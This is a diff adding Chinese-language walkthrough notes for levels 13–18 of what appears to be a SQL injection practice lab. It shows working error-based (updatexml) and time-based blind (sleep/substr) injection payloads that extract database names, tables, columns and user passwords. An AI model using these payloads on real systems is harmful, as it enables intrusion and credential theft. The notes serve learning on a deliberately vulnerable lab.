@@ -510,20 +510,158 @@ uname=-admin") and updatexml(1,concat('^',(select group_concat(username,'~',pass
 这一关也过了。。。
 
 
+## 13. 单引号变形报错注入
+
+* 代理抓包，送到repeater模块
+
+* 看一下闭合方式
+```
+admin'//能看处什么方式闭合就行
+```
 
 
+* 根据报错，试一下报错注入
+```
+uname=admin') and updatexml(1,concat('^',(select database()),'^'),1)#&passwd=&submit=Submit
+```
+![image](https://user-images.githubusercontent.com/76896357/114978311-a5a41900-9ebb-11eb-9725-1f42c9b2b6e6.png)
+
+注入成功
+
+* 试一下能不能联合注入
+
+![image](https://user-images.githubusercontent.com/76896357/114978625-0895b000-9ebc-11eb-87df-d60fee8e19b7.png)
+
+很显然不能，那么，就直接用报错注入就好，和12题类似
 
 
+## 14. POST型bool盲注
+
+* 猜测闭合方式
+```
+admin" and 1=1 #
+```
+![image](https://user-images.githubusercontent.com/76896357/114979112-e3ee0800-9ebc-11eb-9b43-ecf0062f29a0.png)
+
+从这里可以知道“为闭合方式
+
+* 又因为无论输入什么都不会显示，那么只有延时注入，让他睡几秒
+
+* 查库
+
+![image](https://user-images.githubusercontent.com/76896357/114979462-7b535b00-9ebd-11eb-8675-4a8208c6fdec.png)
+
+在这里，进行延时注入的时候发现他报错，有可能存在报错注入
 
 
+延时注入可以爆破，
+
+```
+uname=admin" and updatexml(1,concat('^',(select database()),'^'),1) #&passwd=&submit=Submit 
+```
+
+![image](https://user-images.githubusercontent.com/76896357/114980178-ab4f2e00-9ebe-11eb-9cab-b77cb85d3992.png)
+
+报错注入也可以
+
+下面的就是换语句进行报错注入了，这一关，就先过了
 
 
+## 15. 延时注入
+
+* 尝试了，很多方式，没有回显，没有报错
+
+只能用绝招(绝境用的招数)，延时注入，让他睡！！！
+
+首先说一下，实在比较麻烦，最好用工具爆破，sqlmap更好
+
+* 查看闭合方式：
+
+![image](https://user-images.githubusercontent.com/76896357/114981202-34b33000-9ec0-11eb-9be2-1628936d4fef.png)
+
+只有在__‘__的情况下，才会睡觉，呢么闭合方式就是__’__
 
 
+* 查库
+
+```
+uname=admin' and if(substr(database(),§1§,1)='§s§',sleep(5),1)#&passwd=&submit=Submit//使用substr函数，利用bp爆破
+```
+
+![image](https://user-images.githubusercontent.com/76896357/114982063-8ad4a300-9ec1-11eb-8be4-ec232ce7a37c.png)
+
+* 查表
+```
+uname=admin' and if(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),§1§,1)='§s§',sleep(5),1)#&passwd=&submit=Submit//这里我用的bp爆破，标记点也已经给出，但是只能爆出第一个，需要我们手动改一下limit，后面的那个值
+```
+
+![image](https://user-images.githubusercontent.com/76896357/114982545-2ebe4e80-9ec2-11eb-89c4-9d9233c74629.png)
+
+下面这个就查到了user表！！！
+
+![image](https://user-images.githubusercontent.com/76896357/114982884-8f4d8b80-9ec2-11eb-8f41-c2d52500db0f.png)
+
+* 查列
+```
+uname=admin' and if(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),§1§,1)='§s§',sleep(5),1)#&passwd=&submit=Submit
+```
+查到user列
+
+![image](https://user-images.githubusercontent.com/76896357/114983249-f4a17c80-9ec2-11eb-9e7b-5fcc41552187.png)
+
+查到password列
+
+![image](https://user-images.githubusercontent.com/76896357/114983399-287ca200-9ec3-11eb-8f8a-7b4b1c61e3c5.png)
+
+利用substr函数切割进行查询，还是很快的
+
+* 查字段
+```
+uname=admin' and if(substr((select password from security.users limit 4,1),§1§,1)='§s§',sleep(5),1)#&passwd=&submit=Submit
+```
+![image](https://user-images.githubusercontent.com/76896357/114983971-cec8a780-9ec3-11eb-99f8-79e51f9d9d76.png)
+
+## 16. 双引号延时注入
+
+现在本页面看看，是什么样的类型注入，以及他的闭合方式，发现啥也不显示。。。。。。
+
+完犊子了，又是延时，吐了，看一下，闭合方式吧
+
+差点没试出来
+```
+admin") and if(1=1,sleep(3),1) #
+```
+![image](https://user-images.githubusercontent.com/76896357/114986199-4a2b5880-9ec6-11eb-8f82-4eaee69b0140.png)
+
+剩下的就是类似15题吧
 
 
+## 17. 基于错误的更新查询
 
+**这种情况，一下子给我整懵了，最后就参考别人博客写了一下**
 
+https://blog.csdn.net/qq_41420747/article/details/81836327
+
+那么就针对password搞一下吧
+
+* 查找闭合方式
+
+![image](https://user-images.githubusercontent.com/76896357/114987969-5fa18200-9ec8-11eb-88cd-6a4d73a01074.png)
+
+* 由于报错，那么执行一下报错注入吧
+
+* 查库
+```
+uname=admin&passwd=admin' and updatexml(1,concat('^',database(),'^'),1) #&submit=Submit
+```
+
+![image](https://user-images.githubusercontent.com/76896357/114988290-be66fb80-9ec8-11eb-9e62-a09e39a637f3.png)
+
+## 18. 用户代理头部注入
+
+![image](https://user-images.githubusercontent.com/76896357/114988631-20bffc00-9ec9-11eb-8ced-89ba77c7baa9.png)
+
+看见这样的界面，看见ip，直接抓包
 
 
 
